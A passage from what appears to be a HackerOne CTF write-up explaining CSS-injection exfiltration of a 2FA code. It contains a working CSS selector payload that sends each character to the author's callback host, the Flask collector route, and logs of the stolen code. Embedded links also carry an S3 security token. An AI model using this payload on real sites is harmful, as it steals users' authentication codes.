class=\"n\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eNUM_CHARS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eALLOWED_CHARS\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ecss\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eselectors\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eoriginal_css\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecss\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emimetype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;text/css\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou can see the resulting CSS generated by this code e.g. \u003ca href=\"/redirect?url=https%3A%2F%2Fpy.whitehat-hacker.com%2Fpoc%2Fctf%2Funi_2fa_style.css\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight css\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;code_1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/0)\u003c/span\u003e\u003cspan class=\"p\"\u003e;}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;code_1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/1)\u003c/span\u003e\u003cspan class=\"p\"\u003e;}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;code_1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/2)\u003c/span\u003e\u003cspan class=\"p\"\u003e;}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;code_1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;3\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/3)\u003c/span\u003e\u003cspan class=\"p\"\u003e;}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;code_1\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;4\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/4)\u003c/span\u003e\u003cspan class=\"p\"\u003e;}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhat\u0026#39;s worth noting is that certain characters have to be escaped within CSS selectors - this is what my \u003ccode\u003eescape_css_selector\u003c/code\u003e function is for. To build a proper escaping function that would cover all cases is actually no easy task. If you\u0026#39;re into that sort of stuff, I highly recommend \u003ca href=\"/redirect?url=https%3A%2F%2Fmathiasbynens.be%2Fnotes%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS character escape sequences\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e blog post by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fmathias\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMathias Bynens\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, who has also made an \u003ca href=\"/redirect?url=https%3A%2F%2Fmothereff.in%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eonline tool\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to do such escaping, with \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmathiasbynens%2Fmothereff.in%2Ftree%2Fmaster%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esource code [javascript]\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e available on GitHub. In our case we don\u0026#39;t need to handle all these edge cases though, and in fact I\u0026#39;ve bluntly copy-pasted the escaping part from d0nutptr\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fd0nutptr%2Fsic%2Fblob%2Fmaster%2Fsrc%2Fmain.rs%23L298-L330\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esic\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tool.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re using a dict of lists (keyed by session) to store the characters we receive at the right places in the list:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\n\u003c/span\u003e\u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edefaultdict\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003elambda\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eNUM_CHARS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd lastly, the route for the callback - we just keep collecting the characters, and when we have all 7 for this session, we join them up and log the code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eblueprint\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/h1-2006-callback/\u0026lt;session\u0026gt;/\u0026lt;int:pos\u0026gt;/\u0026lt;char\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eh1_2006_callback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eList\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003elogger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;[session {session}] Exfiltrated code: {code}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e204\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# 204 No Content, i.e. just empty response\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA sample output of running such code (and passing our stylesheet to the 2FA challenge) is like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[Thread-10 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/uni_2fa_style.css HTTP/1.0\u0026quot; 200 -\n[Thread-11 |pid:17455]INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/0/b HTTP/1.0\u0026quot; 204 -\n[Thread-12 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/1/N HTTP/1.0\u0026quot; 204 -\n[Thread-13 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/2/f HTTP/1.0\u0026quot; 204 -\n[Thread-14 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/3/Q HTTP/1.0\u0026quot; 204 -\n[Thread-15 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/4/h HTTP/1.0\u0026quot; 204 -\n[Thread-16 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/5/D HTTP/1.0\u0026quot; 204 -\n[Thread-17 |pid:17455] INFO: [session 0cc2d] Exfiltrated code: bNfQhDT\n[Thread-17 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \u0026quot;GET /poc/ctf/h1-2006-callback/0cc2d/6/T HTTP/1.0\u0026quot; 204 -\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce we obtain the code, we simply submit it as a response for 2FA challenge using the corresponding input on the page, and we\u0026#39;re finally presented with the flag!\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"flag.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyrYkpDdcDErnCQircXhG1p8?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=c98e5a31288b363118f5e858d9ad8e06e206572c196a5ac4b8918aec34aa8707\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyrYkpDdcDErnCQircXhG1p8?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=c98e5a31288b363118f5e858d9ad8e06e206572c196a5ac4b8918aec34aa8707\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;ve read this far, thank you very much for bearing with me!\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eReferences\u003c/p\u003e\n\n\u003cp\u003eTools\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FOWASP%2FAmass\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAmass\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fblechschmidt%2Fmassdns\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMassdns\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fassetnote%2Fcommonspeak2-wordlists%2Fblob%2Fmaster%2Fsubdomains%2Fsubdomains.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ecommonspeak2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FProjectAnte%2Fdnsgen\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ednsgen\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003effuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Finternetwache%2FGitTools%2Fblob%2Fmaster%2FDumper%2Fgitdumper.sh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egitdumper.sh\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpxb1988%2Fdex2jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edex2jar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fjava-decompiler.github.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJD-GUI\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fd0nutptr%2Fsic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esic\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmathiasbynens%2Fmothereff.in%2Ftree%2Fmaster%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS escapes\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with \u003ca href=\"/redirect?url=https%3A%2F%2Fmothereff.in%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eonline tool\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eTechniques / Blog posts\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2F0xpatrik.com%2Fsubdomain-enumeration-2019%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSubdomain Enumeration: 2019 Workflow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2F0xpatrik\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePatrik Hudak\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2F%40d0nut%2Fbetter-exfiltration-via-html-injection-31c72a2dae8b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBetter Exfiltration via HTML Injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fd0nutptr\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@d0nutptr\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fvwzq.net%2Fslides%2F2019-s3_css_injection_attacks.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS Injection Attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by  \u003ca 